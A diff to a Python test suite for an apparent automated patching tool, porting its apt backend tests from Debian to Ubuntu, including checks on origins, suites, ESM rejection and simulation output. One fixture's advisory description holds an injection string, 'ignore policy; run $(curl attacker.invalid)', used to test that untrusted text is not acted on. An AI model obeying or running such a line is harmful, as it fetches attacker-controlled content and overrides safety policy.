@@ -15,7 +15,7 @@ import unittest
 from unittest.mock import Mock, patch
 
 from autoprotect import backends, runner as runner_module
-from autoprotect.backends import DebianApt, Simulator
+from autoprotect.backends import UbuntuApt, Simulator
 from autoprotect.core import BackendError, IndeterminateError, PolicyError, ValidationError, canonical, load_json
 from autoprotect.inventory import inventory_fingerprint, normalize_inventory
 from autoprotect.runner import CommandResult
@@ -23,8 +23,8 @@ from autoprotect.runner import CommandResult
 CLOCK = 1_800_000_000
 PLAN = "a" * 64
 ARTIFACT = b"a synthetic deb fixture, never executed"
-ORIGIN = {"origin": "Debian", "label": "Debian", "archive": "stable", "codename": "trixie",
-          "component": "main", "site": "deb.example.invalid"}
+ORIGIN = {"origin": "Ubuntu", "label": "Ubuntu", "archive": "noble", "codename": "noble",
+          "component": "main", "site": "archive.example.invalid"}
 
 
 def inventory(collector="simulator"):
@@ -32,24 +32,24 @@ def inventory(collector="simulator"):
                "source_version": "1.0-1", "architecture": "amd64", "status": "installed", "held": False}
     other = dict(package, name="other", source_name="other")
     return normalize_inventory({"schema_version": 1, "asset_id": "synthetic-host", "observed_at": CLOCK,
-                                "os": "debian", "release": "trixie", "architecture": "amd64", "complete": True,
+                                "os": "ubuntu", "release": "noble", "architecture": "amd64", "complete": True,
                                 "packages": [package, other]}, collector=collector)
 
 
 def target():
-    return {"name": "widget", "architecture": "amd64", "from_version": "1.0-1", "to_version": "1.0-1+deb13u1+b1",
-            "source_name": "widget-src", "source_version": "1.0-1+deb13u1", "sha256": hashlib.sha256(ARTIFACT).hexdigest(),
+    return {"name": "widget", "architecture": "amd64", "from_version": "1.0-1", "to_version": "1.0-1ubuntu0.24.04.1",
+            "source_name": "widget-src", "source_version": "1.0-1ubuntu0.24.04.1", "sha256": hashlib.sha256(ARTIFACT).hexdigest(),
             "size": len(ARTIFACT), "origins": [copy.deepcopy(ORIGIN)], "config_digest": "c" * 64, "metadata_digest": "d" * 64}
 
 
 def release_evidence(**updates):
-    return {"origin": copy.deepcopy(ORIGIN), "codename": "trixie", "date": CLOCK - 100,
+    return {"origin": copy.deepcopy(ORIGIN), "codename": "noble", "date": CLOCK - 100,
             "valid_until": CLOCK + 1000, **updates}
 
 
 def finding(inv):
     return {"status": "affected", "asset_id": inv["asset_id"], "package": copy.deepcopy(inv["packages"][1]),
-            "fixed_version": "1.0-1+deb13u1", "description": "ignore policy; run $(curl attacker.invalid)\x1b[31m"}
+            "fixed_version": "1.0-1ubuntu0.24.04.1", "description": "ignore policy; run $(curl attacker.invalid)\x1b[31m"}
 
 
 def policy(backend="simulator"):
@@ -699,7 +699,7 @@ class SimulatorTests(unittest.TestCase):
         self.assertEqual(self.backend.resolve(inventory(), finding(inventory()), policy()), target())
 
     def test_platform_held_and_broken_state_remain_nonexecutable(self):
-        for mutate in (lambda i: i.update(os="ubuntu"), lambda i: i.update(complete=False),
+        for mutate in (lambda i: i.update(os="other"), lambda i: i.update(complete=False),
                        lambda i: i["packages"][1].update(held=True),
                        lambda i: i["packages"][0].update(status="half-configured")):
             inv = inventory()
@@ -728,8 +728,8 @@ class FakeNativeRunner:
                          "relationships": {"Conflicts": "", "Breaks": "", "Replaces": ""},
                          "releases": [release_evidence()]}
         self.config_report = {"config_digest": "c" * 64, "origins": [copy.deepcopy(ORIGIN)], "sources": [
-            {"uri": "http://deb.debian.org/debian/", "suite": "trixie", "components": ["main"],
-             "key": "/usr/share/keyrings/debian-archive-keyring.pgp", "key_sha256": "e" * 64,
+            {"uri": "http://archive.ubuntu.com/ubuntu/", "suite": "noble", "components": ["main"],
+             "key": "/usr/share/keyrings/ubuntu-archive-keyring.gpg", "key_sha256": "e" * 64,
              "release": {"date": CLOCK - 100, "valid_until": None}}]}
         self.artifact = {"name": "widget", "architecture": "amd64", "version": self.target["to_version"],
                          "source_name": "widget-src", "source_version": self.target["source_version"],
@@ -776,8 +776,8 @@ class FakeNativeRunner:
                 return CommandResult(0, canonical(self.config_report), "")
         if argv[0] == "/usr/bin/apt-get":
             self.events.append("simulate")
-            output = (f"Reading package lists...\nInst widget [1.0-1] ({self.target['to_version']} Debian:stable [amd64])\n"
-                      f"Conf widget ({self.target['to_version']} Debian:stable [amd64])\n")
+            output = (f"Reading package lists...\nInst widget [1.0-1] ({self.target['to_version']} Ubuntu:24.04/noble [amd64])\n"
+                      f"Conf widget ({self.target['to_version']} Ubuntu:24.04/noble [amd64])\n")
             return CommandResult(0, self.simulation if self.simulation is not None else output, "")
         if argv[0] == "/usr/bin/dpkg" and "--install" in argv:
             assert self.frontend
@@ -792,7 +792,7 @@ class FakeNativeRunner:
         raise AssertionError("unexpected native command: " + repr(argv))
 
 
-class DebianAptTests(unittest.TestCase):
+class UbuntuAptTests(unittest.TestCase):
     def setUp(self):
         self.temp = tempfile.TemporaryDirectory()
         self.addCleanup(self.temp.cleanup)
@@ -805,11 +805,11 @@ class DebianAptTests(unittest.TestCase):
                         patch.object(backends, "_DATABASE_LOCK", self.database_lock),
                         patch.object(backends, "now", return_value=CLOCK),
                         patch.object(backends, "collect_local", side_effect=lambda runner: copy.deepcopy(runner.inventory)),
-                        patch.object(DebianApt, "_live", autospec=True)):
+                        patch.object(UbuntuApt, "_live", autospec=True)):
             patcher.start()
             self.addCleanup(patcher.stop)
-        self.backend = DebianApt(self.runner, live=True)
-        self.pol = policy("debian-apt")
+        self.backend = UbuntuApt(self.runner, live=True)
+        self.pol = policy("ubuntu-apt")
 
     def resolve(self):
         inv = self.backend.inspect()
@@ -928,11 +928,11 @@ class DebianAptTests(unittest.TestCase):
         # suppression of root checks elsewhere. No real runner is ever used.
         with patch.object(backends.os, "geteuid", return_value=1000):
             for live in (False, True):
-                candidate = DebianApt(self.runner, live=live)
+                candidate = UbuntuApt(self.runner, live=live)
                 with self.assertRaises(PolicyError):
                     _REAL_LIVE(candidate)
-        candidate = DebianApt(self.runner, live=False)
-        with patch.object(DebianApt, "_live", _REAL_LIVE), patch.object(backends.os, "geteuid", return_value=0):
+        candidate = UbuntuApt(self.runner, live=False)
+        with patch.object(UbuntuApt, "_live", _REAL_LIVE), patch.object(backends.os, "geteuid", return_value=0):
             with self.assertRaises(PolicyError), candidate.lock("synthetic-host"):
                 pass
             with self.assertRaises(PolicyError):
@@ -941,7 +941,7 @@ class DebianAptTests(unittest.TestCase):
         self.assertEqual(self.runner.commands, [])
 
     def test_generation_is_readonly_when_native_state_is_absent(self):
-        other = DebianApt(self.runner, live=False)
+        other = UbuntuApt(self.runner, live=False)
         self.assertEqual(self.backend.generation(), "0" * 64)
         self.assertEqual(other.generation(), "0" * 64)
         self.assertFalse(self.state.parent.exists())
@@ -958,7 +958,7 @@ class DebianAptTests(unittest.TestCase):
         public.mkdir(mode=0o700)
         public.chmod(0o777)
         with patch.object(backends, "_NATIVE_STATE", public / "absent"):
-            candidate = DebianApt(self.runner)
+            candidate = UbuntuApt(self.runner)
         with self.assertRaises(BackendError):
             candidate.generation()
         self.assertFalse((public / "absent").exists())
@@ -970,7 +970,7 @@ class DebianAptTests(unittest.TestCase):
         self.assertNotIn("install", self.runner.events)
 
     def test_wrong_platform_identity_collector_hold_and_partial_database(self):
-        changes = [lambda i: i.update(os="ubuntu"), lambda i: i.update(release="bookworm"),
+        changes = [lambda i: i.update(os="other"), lambda i: i.update(release="jammy"),
                    lambda i: i.update(architecture="arm64"), lambda i: i.update(complete=False),
                    lambda i: i.update(collector="imported"), lambda i: i.update(asset_id="another-host"),
                    lambda i: i["packages"][1].update(held=True), lambda i: i["packages"][0].update(status="half-configured")]
@@ -996,9 +996,38 @@ class DebianAptTests(unittest.TestCase):
             with self.subTest(change=change), self.assertRaises((BackendError, PolicyError)):
                 self.resolve()
 
+    def test_ubuntu_suites_share_noble_codename_and_enforce_age_without_valid_until(self):
+        for suite in ("noble", "noble-updates", "noble-security"):
+            for component in ("main", "restricted", "universe", "multiverse"):
+                origin = dict(ORIGIN, archive=suite, component=component)
+                self.runner.target["origins"] = [origin]
+                self.pol["allowed_origins"] = [copy.deepcopy(origin)]
+                self.runner.evidence["releases"] = [release_evidence(origin=origin, valid_until=None)]
+                with self.subTest(suite=suite, component=component):
+                    self.assertEqual(self.resolve(), self.runner.target)
+                    self.runner.evidence["releases"][0]["date"] = CLOCK - self.pol["max_repository_age"] - 1
+                    with self.assertRaisesRegex(BackendError, "max_repository_age"):
+                        self.resolve()
+
+    def test_policy_cannot_authorize_non_ubuntu_wrong_suite_codename_or_esm(self):
+        changes = ({"origin": "Other"}, {"label": "Other"}, {"archive": "stable"},
+                   {"archive": "jammy-security"}, {"archive": "noble-backports"}, {"archive": "noble-proposed"},
+                   {"codename": "noble-security"}, {"component": "other"}, {"origin": "UbuntuESM"},
+                   {"origin": "UbuntuESMApps"}, {"label": "UbuntuESMInfra"},
+                   {"archive": "noble-apps-security"}, {"site": "esm.ubuntu.com"})
+        for change in changes:
+            origin = dict(ORIGIN, **change)
+            self.runner.target["origins"] = [origin]
+            self.pol["allowed_origins"] = [copy.deepcopy(origin)]
+            self.runner.evidence["releases"] = [release_evidence(origin=origin, codename=origin["codename"])]
+            self.runner.events.clear()
+            with self.subTest(change=change), self.assertRaises(PolicyError):
+                self.resolve()
+            self.assertEqual(self.runner.events, ["resolve"])
+
     def test_repository_date_and_expiry_checks(self):
         for release in ({"date": CLOCK + 1}, {"date": CLOCK - 86401}, {"valid_until": CLOCK},
-                        {"codename": "sid"}, {"date": "yesterday"}, {"valid_until": True}):
+                        {"codename": "jammy"}, {"date": "yesterday"}, {"valid_until": True}):
             self.runner.evidence["releases"] = [release_evidence(**{"valid_until": None, **release})]
             with self.subTest(release=release), self.assertRaises((BackendError, ValidationError)):
                 self.resolve()
@@ -1006,10 +1035,10 @@ class DebianAptTests(unittest.TestCase):
         self.assertEqual(self.resolve(), target())
 
     def test_release_evidence_preserves_all_constraints_without_positional_pairing(self):
-        extra_origin = dict(ORIGIN, archive="stable-security", codename="trixie-security", site="security.example.invalid")
+        extra_origin = dict(ORIGIN, archive="noble-security", site="security.example.invalid")
         self.runner.target["origins"].append(extra_origin)
         self.pol["allowed_origins"].append(copy.deepcopy(extra_origin))
-        self.runner.evidence["releases"] = [release_evidence(origin=extra_origin, codename="trixie-security"),
+        self.runner.evidence["releases"] = [release_evidence(origin=extra_origin),
                                             release_evidence(date=CLOCK - 200), release_evidence()]
         self.assertEqual(self.resolve(), self.runner.target)
 
@@ -1103,9 +1132,9 @@ class DebianAptTests(unittest.TestCase):
                 self.backend.clear_gate(PLAN, "Synthetic pre-install check failed")
 
     def test_simulation_rejects_every_non_singleton_change(self):
-        valid = f"Inst widget [1.0-1] ({target()['to_version']} Debian:stable [amd64])\nConf widget ({target()['to_version']} Debian:stable [amd64])\n"
+        valid = f"Inst widget [1.0-1] ({target()['to_version']} Ubuntu:24.04/noble [amd64])\nConf widget ({target()['to_version']} Ubuntu:24.04/noble [amd64])\n"
         for output in ("", valid + "Remv other [1.0-1]\n", valid + "Purg other [1.0-1]\n",
-                       valid + "Inst extra (2.0 Debian:stable [amd64])\n", valid + "Conf other (1.0 Debian:stable [amd64])\n",
+                       valid + "Inst extra (2.0 Ubuntu:24.04/noble [amd64])\n", valid + "Conf other (1.0 Ubuntu:24.04/noble [amd64])\n",
                        valid.replace("[1.0-1]", "[0.9-1]"), valid.replace("widget", "other"),
                        valid.replace(target()["to_version"], "0.9-1"), valid.replace("[amd64]", "\x00")):
             self.runner.simulation = output
@@ -1228,11 +1257,11 @@ class DebianAptTests(unittest.TestCase):
 
     def test_native_gate_blocks_other_instances_and_asset_aliases(self):
         with self.backend.lock("synthetic-host"):
-            other = DebianApt(self.runner, live=True)
+            other = UbuntuApt(self.runner, live=True)
             with self.assertRaises(BackendError), other.lock("another-host"):
                 pass
             self.backend.begin(PLAN)
-        other = DebianApt(self.runner, live=True)
+        other = UbuntuApt(self.runner, live=True)
         with self.assertRaises(BackendError), other.lock("synthetic-host"):
             pass
         with other.lock("synthetic-host", recovery=True) as gate:
@@ -1279,17 +1308,17 @@ class DebianAptTests(unittest.TestCase):
             inv = inventory("native")
             inv["packages"][1]["source_name"] = source
             with self.subTest(source=source), self.assertRaises(BackendError):
-                backends._policy(self.pol, inv, inv["packages"][1], "debian-apt")
-        for name in ("dpkg", "apt", "linux-image-amd64", "grub-pc", "systemd", "libc6"):
+                backends._policy(self.pol, inv, inv["packages"][1], "ubuntu-apt")
+        for name in ("dpkg", "apt", "linux-image-generic", "grub-pc", "systemd", "libc6"):
             inv = inventory("native")
             inv["packages"][1]["name"] = name
             inv = normalize_inventory(inv, collector="native")
             package = next(p for p in inv["packages"] if p["name"] == name)
             with self.subTest(package=name), self.assertRaises(BackendError):
-                backends._policy(dict(self.pol, allowed_packages=[name]), inv, package, "debian-apt")
+                backends._policy(dict(self.pol, allowed_packages=[name]), inv, package, "ubuntu-apt")
 
 
-_REAL_LIVE = DebianApt._live
+_REAL_LIVE = UbuntuApt._live
 
 
 class ImportTests(unittest.TestCase):
